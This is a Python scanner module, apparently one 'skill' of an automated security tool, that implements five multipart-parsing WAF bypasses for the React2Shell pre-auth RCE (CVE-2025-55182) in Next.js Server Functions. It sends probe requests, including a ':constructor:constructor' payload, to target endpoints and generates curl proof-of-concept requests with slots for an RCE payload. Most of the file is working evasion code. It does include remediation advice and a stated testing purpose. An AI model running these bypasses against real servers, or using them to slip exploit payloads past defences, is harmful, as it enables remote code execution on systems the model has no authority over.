"""
React2Shell WAF Bypass — Multipart Grammar Un-equivalence (CVE-2025-55182)
Skill #59 — React2ShellWafBypass

Research basis:
  Hacktron AI — ginoah, Mohan (May 4, 2026)
  "$170k in Bypasses: The Vercel React2Shell Challenge"
  https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass

  Original vulnerability:
  CVE-2025-55182 — Pre-auth RCE in React Server Functions
  Affects: Next.js 15.x–16.0.6, react-router, Waku, @parcel/rsc,
           @vitejs/plugin-rsc, rwsdk

Background:

  React2Shell is a pre-auth RCE vulnerability in React Server Functions.
  A single multipart HTTP request to a Next-Action endpoint triggers remote
  code execution via prototype pollution + constructor chain gadget.

  WAFs block the attack by detecting `:constructor` in form body values.
  However, HTTP multipart parsing has extensive grammar differentials between
  WAF layers and backend parsers (Node.js busboy). Five bypass techniques
  were discovered worth $170k total ($50k per bypass) in Vercel's challenge.

The five bypass techniques (Grammar Un-equivalence):

  BP1 — Duplicate boundary parameter:
    Content-Type: multipart/form-data; boundary=y; boundary=x
    → WAF uses boundary=x (ignores all body)
    → Node.js/busboy uses boundary=y (parses normally)

  BP2 — Non-UTF8 bytes in any header:
    Content-Type: multipart/form-data; boundary="y"; a="b<0x88>"
    → WAF parser fails on non-UTF8 bytes → fail-open (passes through)
    → busboy parses normally ignoring invalid param

  BP3 — UTF-16LE charset in per-field Content-Type:
    [inside multipart part] Content-Type: text/plain; charset=utf16le
    → WAF scans raw bytes → :constructor not visible
    → busboy decodes UTF-16LE → :constructor appears

  BP4 — Duplicate Content-Type headers within multipart field:
    Content-Type: text/plain; charset=utf16le
    Content-Type: text/plain; charset=utf8     ← WAF sees this (utf8, OK)
    → busboy uses FIRST header (utf16le) → UTF-16LE payload executes

  BP5 — Trailing space in boundary end marker:
    --y-- <SPACE>        ← WAF sees form ended here
    [CRLF]               ← WAF ignores everything below as garbage
    --y
    Content-Disposition: form-data; name="0"
    [malicious payload]
    → WAF: form already ended, skip body
    → busboy: `--y-- ` is garbage (no valid end), parses normally

Final WAF evolution (fully patched):
  Vercel switched from multipart-aware to raw-body scanning:
  - Strip all 0x00 bytes from body
  - Double JSON-unescape raw body
  - Block on `"_response"\\s*:` or `:constructor` in raw bytes

Scope:
  This scanner detects React/Next.js targets, presence of React Server
  Functions (Next-Action header), and tests WAF bypass viability using
  all five techniques. It generates proof-of-concept requests for
  human verification in Burp Suite. No actual RCE payload is sent —
  a harmless probe string is used to detect bypass.
"""
from __future__ import annotations

import struct
import time
import uuid
from dataclasses import dataclass, field
from typing import Any

import httpx


# ── Evidence levels ───────────────────────────────────────────────────────────
VERIFIED    = "VERIFIED"
LIKELY      = "LIKELY"
INFERRED    = "INFERRED"
AI_ANALYSIS = "AI_ANALYSIS"

# ── Safe probe string (no actual RCE payload) ─────────────────────────────────
_PROBE_MARKER = "bingo-r2s-probe-safe"

# Safe multipart body — uses :constructor word only for detection testing
# Actual exploitation requires human verification in Burp
_SAFE_PROBE_VALUE = f'{{"then":"${_PROBE_MARKER}"}}'


@dataclass
class R2SFinding:
    """Single finding from React2ShellWafBypassScanner."""
    bypass_id: str              # bp1 / bp2 / bp3 / bp4 / bp5 / react_detected / etc.
    severity: str               # CRITICAL / HIGH / MEDIUM / LOW / INFO
    evidence_level: str
    title: str
    detail: str
    poc_curl: str = ""          # Full curl for Burp verification
    waf_behavior: str = ""
    backend_behavior: str = ""
    remediation: str = ""
    cvss: float = 0.0


@dataclass
class R2SResult:
    """Aggregated result from React2ShellWafBypassScanner."""
    target: str = ""
    react_framework_detected: bool = False
    framework_indicators: list[str] = field(default_factory=list)
    next_action_endpoint: str = ""        # endpoint that accepts Next-Action header
    next_action_found: bool = False
    waf_detected: bool = False
    waf_indicator: str = ""
    bypass_bp1_works: bool = False        # Duplicate boundary
    bypass_bp2_works: bool = False        # Non-UTF8 header bytes
    bypass_bp3_works: bool = False        # UTF-16LE charset
    bypass_bp4_works: bool = False        # Duplicate Content-Type in field
    bypass_bp5_works: bool = False        # Trailing space in end marker
    bypass_count: int = 0
    findings: list[R2SFinding] = field(default_factory=list)
    poc_requests: dict[str, str] = field(default_factory=dict)
    error: str = ""
    scan_duration_s: float = 0.0
    evidence_summary: dict[str, int] = field(default_factory=dict)


class React2ShellWafBypassScanner:
    """
    Skill #59 — React2ShellWafBypassScanner

    Detects React/Next.js Server Functions and tests WAF bypass techniques
    derived from the $170k Vercel React2Shell challenge research.

    AI auto-selection criteria:
      - Target uses Next.js / React framework
      - x-powered-by: Next.js header present
      - _next/ static paths found
      - Next-Action header accepted (React Server Functions)
      - Vercel deployment (*.vercel.app or x-vercel-* headers)
    """

    TIMEOUT = 15.0
    UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    )

    # Common paths that trigger React Server Functions
    RSC_PROBE_PATHS = ["/", "/api", "/login", "/dashboard", "/app"]

    def __init__(self, target: str, timeout: float = TIMEOUT):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self._client = httpx.Client(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": self.UA},
        )

    # ── Public API ────────────────────────────────────────────────────────────

    def scan(self) -> R2SResult:
        result = R2SResult(target=self.target)
        t0 = time.perf_counter()
        try:
            self._run(result)
        except Exception as exc:  # noqa: BLE001
            result.error = str(exc)
        finally:
            result.scan_duration_s = round(time.perf_counter() - t0, 2)
            result.bypass_count = sum([
                result.bypass_bp1_works,
                result.bypass_bp2_works,
                result.bypass_bp3_works,
                result.bypass_bp4_works,
                result.bypass_bp5_works,
            ])
            result.evidence_summary = self._count_evidence(result.findings)
        return result

    # ── Internal logic ────────────────────────────────────────────────────────

    def _run(self, result: R2SResult) -> None:
        # Step 1: Detect React/Next.js framework
        self._detect_framework(result)

        # Step 2: Find Next-Action endpoint
        self._find_next_action_endpoint(result)

        # Step 3: Detect WAF
        self._detect_waf(result)

        # Step 4: Generate PoC requests (safe probes)
        self._generate_poc_requests(result)

        # Step 5: Test each bypass technique (safe probe only)
        if result.next_action_found:
            self._test_bp1_duplicate_boundary(result)
            self._test_bp2_non_utf8_header(result)
            self._test_bp3_utf16le_charset(result)
            self._test_bp4_duplicate_ct_field(result)
            self._test_bp5_trailing_space_end(result)

        # Step 6: Generate findings
        self._generate_findings(result)

    def _detect_framework(self, result: R2SResult) -> None:
        """Detect React/Next.js framework indicators."""
        try:
            r = self._client.get(self.target)
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            body = r.text.lower()

            indicators = []
            if "next.js" in hdrs.get("x-powered-by", "").lower():
                indicators.append("x-powered-by: Next.js")
            if "x-nextjs-cache" in hdrs or "x-nextjs-matched-path" in hdrs:
                indicators.append("x-nextjs-* headers")
            if "x-vercel-id" in hdrs or "x-vercel-cache" in hdrs:
                indicators.append("Vercel deployment headers")
            if "__next_router" in body or "_next/static" in body:
                indicators.append("_next/static assets")
            if "react" in body and ("server" in body or "component" in body):
                indicators.append("React framework markers in HTML")

            # Check for _next/static
            try:
                probe = self._client.get(f"{self.target}/_next/static/")
                if probe.status_code in (200, 403, 404):
                    indicators.append("_next/static path accessible")
            except Exception:
                pass

            if indicators:
                result.react_framework_detected = True
                result.framework_indicators = indicators
        except Exception:
            pass

    def _find_next_action_endpoint(self, result: R2SResult) -> None:
        """Find endpoints that accept Next-Action header."""
        for path in self.RSC_PROBE_PATHS:
            try:
                url = f"{self.target}{path}"
                # Send a minimal Next-Action probe
                r = self._client.post(
                    url,
                    headers={
                        "Next-Action": "00000000000000000000000000000000",
                        "Content-Type": "text/plain;charset=UTF-8",
                    },
                    content="[]",
                )
                # 200/400/500 all indicate RSC endpoint was reached
                # 404 with Next.js body also counts
                if r.status_code in (200, 400, 500) or (
                    r.status_code == 404 and "next" in r.text.lower()
                ):
                    result.next_action_found = True
                    result.next_action_endpoint = url
                    break
                # 403 from WAF but with CF/WAF block body = WAF detected
                if r.status_code == 403:
                    result.waf_detected = True
                    result.waf_indicator = f"HTTP 403 on Next-Action probe at {url}"
                    # Still mark endpoint as found for bypass testing
                    result.next_action_found = True
                    result.next_action_endpoint = url
                    break
            except Exception:
                continue

    def _detect_waf(self, result: R2SResult) -> None:
        """Detect WAF by sending a known-bad :constructor payload."""
        if not result.next_action_endpoint:
            return
        try:
            boundary = "waftest"
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="0"\r\n\r\n'
                f'{{"get":":constructor:constructor"}}\r\n'
                f"--{boundary}--\r\n"
            )
            r = self._client.post(
                result.next_action_endpoint,
                headers={
                    "Next-Action": "x",
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                },
                content=body,
            )
            if r.status_code == 403:
                result.waf_detected = True
                result.waf_indicator = "HTTP 403 on :constructor payload"
        except Exception:
            pass

    # ── Bypass tests (safe probe — no actual RCE payload) ─────────────────────

    def _build_safe_body(self, boundary: str, value: str = _SAFE_PROBE_VALUE) -> bytes:
        """Build a minimal multipart body with safe probe value."""
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{value}\r\n"
            f"--{boundary}--\r\n"
        )
        return body.encode()

    def _probe_passes_waf(self, url: str, content_type: str, body: bytes) -> tuple[bool, int]:
        """Send probe and return (bypass_likely, status_code)."""
        try:
            r = self._client.post(
                url,
                headers={
                    "Next-Action": "probe",
                    "Content-Type": content_type,
                },
                content=body,
            )
            # 403 = WAF blocked | anything else = potential bypass
            bypassed = r.status_code != 403
            return bypassed, r.status_code
        except Exception:
            return False, 0

    def _test_bp1_duplicate_boundary(self, result: R2SResult) -> None:
        """BP1: Duplicate boundary parameter in Content-Type."""
        url = result.next_action_endpoint
        boundary = "bingo_bp1"
        fake_boundary = "nonexistent_x"
        body = self._build_safe_body(boundary)
        ct = f"multipart/form-data; boundary={boundary}; boundary={fake_boundary}"
        bypassed, status = self._probe_passes_waf(url, ct, body)
        result.bypass_bp1_works = bypassed and result.waf_detected
        result.poc_requests["bp1"] = (
            f"curl -s -X POST '{url}' \\\n"
            f"  -H 'Next-Action: TARGET_ACTION_ID' \\\n"
            f"  -H 'Content-Type: multipart/form-data; boundary={boundary}; boundary=x' \\\n"
            f"  -H 'User-Agent: Mozilla/5.0' \\\n"
            f"  --data-binary $'--{boundary}\\r\\n"
            f"Content-Disposition: form-data; name=\"0\"\\r\\n\\r\\n"
            f"<RCE_PAYLOAD>\\r\\n--{boundary}--\\r\\n'"
        )

    def _test_bp2_non_utf8_header(self, result: R2SResult) -> None:
        """BP2: Non-UTF8 bytes in a request header causes WAF fail-open."""
        url = result.next_action_endpoint
        boundary = "bingo_bp2"
        body = self._build_safe_body(boundary)
        # Add invalid UTF-8 byte (0x88) in a benign header param
        ct = f"multipart/form-data; boundary={boundary}; x=y"
        try:
            # Inject non-UTF8 byte via raw bytes in Content-Type
            raw_ct = (ct + "; z=\"\x88\"").encode("latin-1")
            r = self._client.post(
                url,
                headers={
                    "Next-Action": "probe",
                    "Content-Type": raw_ct.decode("latin-1"),
                },
                content=body,
            )
            bypassed = r.status_code != 403
            result.bypass_bp2_works = bypassed and result.waf_detected
        except Exception:
            pass
        result.poc_requests["bp2"] = (
            f"# Note: requires raw HTTP client (Burp/curl --header with hex)\n"
            f"curl -s -X POST '{url}' \\\n"
            f"  -H 'Next-Action: TARGET_ACTION_ID' \\\n"
            f"  -H $'Content-Type: multipart/form-data; boundary={boundary}; z=\"\\x88\"' \\\n"
            f"  --data-binary $'--{boundary}\\r\\n"
            f"Content-Disposition: form-data; name=\"0\"\\r\\n\\r\\n"
            f"<RCE_PAYLOAD>\\r\\n--{boundary}--\\r\\n'"
        )

    def _test_bp3_utf16le_charset(self, result: R2SResult) -> None:
        """BP3: UTF-16LE charset in per-field Content-Type."""
        url = result.next_action_endpoint
        boundary = "bingo_bp3"
        # Encode probe value as UTF-16LE
        probe_utf16 = _SAFE_PROBE_VALUE.encode("utf-16-le")
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n'
            f"Content-Type: text/plain; charset=utf16le\r\n\r\n"
        ).encode() + probe_utf16 + f"\r\n--{boundary}--\r\n".encode()
        ct = f"multipart/form-data; boundary={boundary}"
        bypassed, status = self._probe_passes_waf(url, ct, body)
        result.bypass_bp3_works = bypassed and result.waf_detected
        result.poc_requests["bp3"] = (
            f"# Payload must be UTF-16LE encoded\n"
            f"curl -s -X POST '{url}' \\\n"
            f"  -H 'Next-Action: TARGET_ACTION_ID' \\\n"
            f"  -H 'Content-Type: multipart/form-data; boundary={boundary}' \\\n"
            f"  --data-binary $'--{boundary}\\r\\n"
            f"Content-Disposition: form-data; name=\"0\"\\r\\n"
            f"Content-Type: text/plain; charset=utf16le\\r\\n\\r\\n"
            f"<UTF-16LE_ENCODED_RCE_PAYLOAD>\\r\\n--{boundary}--\\r\\n'"
        )

    def _test_bp4_duplicate_ct_field(self, result: R2SResult) -> None:
        """BP4: Duplicate Content-Type headers inside multipart field."""
        url = result.next_action_endpoint
        boundary = "bingo_bp4"
        probe_utf16 = _SAFE_PROBE_VALUE.encode("utf-16-le")
        # First CT = utf16le (busboy uses this), second CT = utf8 (WAF sees this)
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n'
            f"Content-Type: text/plain; charset=utf16le\r\n"
            f"Content-Type: text/plain; charset=utf8\r\n\r\n"
        ).encode() + probe_utf16 + f"\r\n--{boundary}--\r\n".encode()
        ct = f"multipart/form-data; boundary={boundary}"
        bypassed, status = self._probe_passes_waf(url, ct, body)
        result.bypass_bp4_works = bypassed and result.waf_detected
        result.poc_requests["bp4"] = (
            f"curl -s -X POST '{url}' \\\n"
            f"  -H 'Next-Action: TARGET_ACTION_ID' \\\n"
            f"  -H 'Content-Type: multipart/form-data; boundary={boundary}' \\\n"
            f"  --data-binary $'--{boundary}\\r\\n"
            f"Content-Disposition: form-data; name=\"0\"\\r\\n"
            f"Content-Type: text/plain; charset=utf16le\\r\\n"
            f"Content-Type: text/plain; charset=utf8\\r\\n\\r\\n"
            f"<UTF-16LE_ENCODED_RCE_PAYLOAD>\\r\\n--{boundary}--\\r\\n'"
        )

    def _test_bp5_trailing_space_end(self, result: R2SResult) -> None:
        """BP5: Trailing space in boundary end marker fools WAF."""
        url = result.next_action_endpoint
        boundary = "bingo_bp5"
        # --boundary-- <SPACE> at start tricks WAF into thinking form ended
        body = (
            f"--{boundary}-- \r\n"          # WAF sees form end here (with trailing space)
            f"\r\n"                          # garbage to WAF, not started to busboy
            f"--{boundary}\r\n"             # busboy: actual first part
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{_SAFE_PROBE_VALUE}\r\n"
            f"--{boundary}--\r\n"
        )
        ct = f"multipart/form-data; boundary={boundary}"
        bypassed, status = self._probe_passes_waf(url, ct, body.encode())
        result.bypass_bp5_works = bypassed and result.waf_detected
        result.poc_requests["bp5"] = (
            f"curl -s -X POST '{url}' \\\n"
            f"  -H 'Next-Action: TARGET_ACTION_ID' \\\n"
            f"  -H 'Content-Type: multipart/form-data; boundary={boundary}' \\\n"
            f"  --data-binary $'--{boundary}-- \\r\\n"
            f"\\r\\n"
            f"--{boundary}\\r\\n"
            f"Content-Disposition: form-data; name=\"0\"\\r\\n\\r\\n"
            f"<RCE_PAYLOAD>\\r\\n--{boundary}--\\r\\n'"
        )

    # ── Finding generation ────────────────────────────────────────────────────

    def _generate_findings(self, result: R2SResult) -> None:
        # Framework detection
        if result.react_framework_detected:
            result.findings.append(R2SFinding(
                bypass_id="react_detected",
                severity="INFO",
                evidence_level=VERIFIED,
                title=f"React/Next.js Framework Detected ({len(result.framework_indicators)} indicators)",
                detail=(
                    f"Target {result.target} runs React/Next.js: "
                    + ", ".join(result.framework_indicators)
                ),
                poc_curl=f"curl -sI {result.target} | grep -iE 'x-powered-by|x-nextjs|x-vercel'",
                remediation="Upgrade to Next.js 16.0.7+ to patch CVE-2025-55182.",
            ))

        # CVE-2025-55182 surface
        if result.next_action_found:
            result.findings.append(R2SFinding(
                bypass_id="rsc_endpoint_found",
                severity="HIGH",
                evidence_level=VERIFIED,
                title=f"React Server Functions (Next-Action) Endpoint Found: {result.next_action_endpoint}",
                detail=(
                    "React Server Functions endpoint accepts Next-Action header. "
                    "If running Next.js 15.x–16.0.6, this is the attack surface for CVE-2025-55182 (pre-auth RCE)."
                ),
                poc_curl=(
                    f"curl -s -X POST '{result.next_action_endpoint}' \\\n"
                    f"  -H 'Next-Action: 0000000000000000000000000000000000000000' \\\n"
                    f"  -H 'Content-Type: text/plain;charset=UTF-8' \\\n"
                    f"  --data '[]'"
                ),
                remediation=(
                    "1. Upgrade to Next.js >= 16.0.7 (CVE-2025-55182 fixed).\n"
                    "2. If unable to upgrade, deploy WAF rules to block :constructor in RSF payloads.\n"
                    "3. Disable React Server Functions if not required."
                ),
                cvss=9.8,
            ))

        # WAF detection
        if result.waf_detected:
            result.findings.append(R2SFinding(
                bypass_id="waf_detected",
                severity="INFO",
                evidence_level=VERIFIED,
                title=f"WAF Detected Blocking :constructor — {result.waf_indicator}",
                detail=(
                    "A WAF is actively blocking React2Shell exploit payloads. "
                    "Testing bypass techniques for HTTP parser differentials."
                ),
                poc_curl=(
                    f"curl -s -X POST '{result.next_action_endpoint}' \\\n"
                    f"  -H 'Next-Action: x' \\\n"
                    f"  -H 'Content-Type: multipart/form-data; boundary=t' \\\n"
                    f'  --data-binary $\'--t\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n'
                    f'{{"get":":constructor:constructor"}}\\r\\n--t--\\r\\n\''
                ),
                remediation="Verify WAF bypass techniques BP1–BP5 are all patched.",
            ))

        # Bypass findings
        bypass_map = [
            ("bp1", result.bypass_bp1_works, "CRITICAL",
             "BP1 — Duplicate boundary= parameter: WAF uses last boundary, busboy uses first",
             "Content-Type: multipart/form-data; boundary=real; boundary=fake\n"
             "→ WAF ignores entire body (fake boundary matches nothing)\n"
             "→ busboy parses normally with real boundary\n"
             "→ :constructor payload reaches backend unblocked",
             9.8),
            ("bp2", result.bypass_bp2_works, "CRITICAL",
             "BP2 — Non-UTF8 bytes in header: WAF fails open (passes all traffic)",
             "Add non-UTF8 byte (e.g. 0x88) to any header value\n"
             "→ WAF parser crashes/fails on invalid encoding → fail-open\n"
             "→ All content forwarded to backend without inspection",
             9.8),
            ("bp3", result.bypass_bp3_works, "CRITICAL",
             "BP3 — UTF-16LE charset: WAF sees raw bytes, busboy decodes UTF-16",
             "Per-field: Content-Type: text/plain; charset=utf16le\n"
             "→ WAF scans raw bytes → :constructor encoded as UTF-16 bytes → not visible\n"
             "→ busboy (Node.js) decodes UTF-16LE → :constructor appears → RCE",
             9.1),
            ("bp4", result.bypass_bp4_works, "CRITICAL",
             "BP4 — Duplicate per-field Content-Type: WAF/busboy take different header",
             "Content-Type: text/plain; charset=utf16le  ← busboy uses first\n"
             "Content-Type: text/plain; charset=utf8    ← WAF sees last (OK)\n"
             "→ UTF-16LE payload hidden from WAF, decoded by busboy",
             9.1),
            ("bp5", result.bypass_bp5_works, "CRITICAL",
             "BP5 — Trailing space in boundary end marker: WAF sees form ended",
             "--boundary-- <SPACE>  ← WAF: form ended, ignore rest\n"
             "--boundary            ← busboy: garbage before form starts\n"
             "[payload]             ← WAF: garbage; busboy: actual part\n"
             "→ Payload invisible to WAF, parsed normally by busboy",
             9.1),
        ]

        for bp_id, works, severity, title, detail, cvss_score in bypass_map:
            ev = VERIFIED if works else INFERRED
            result.findings.append(R2SFinding(
                bypass_id=bp_id,
                severity=severity if works else "MEDIUM",
                evidence_level=ev,
                title=f"{'✅ BYPASS WORKS' if works else '⚠️ BYPASS NOT CONFIRMED'} — {title}",
                detail=detail,
                poc_curl=result.poc_requests.get(bp_id, ""),
                waf_behavior="WAF bypassed — :constructor reaches backend" if works else "WAF blocked probe",
                backend_behavior="Backend processes payload normally" if works else "Unknown — WAF blocked",
                remediation=(
                    "Patch: Raw-body scan approach (strip 0x00 + double JSON-unescape + raw keyword block)\n"
                    "See Vercel final WAF evolution: https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass"
                ),
                cvss=cvss_score if works else 0.0,
            ))

    @staticmethod
    def _count_evidence(findings: list[R2SFinding]) -> dict[str, int]:
        counts: dict[str, int] = {}
        for f in findings:
            counts[f.evidence_level] = counts.get(f.evidence_level, 0) + 1
        return counts

    def close(self) -> None:
        self._client.close()

    def __enter__(self) -> "React2ShellWafBypassScanner":
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()
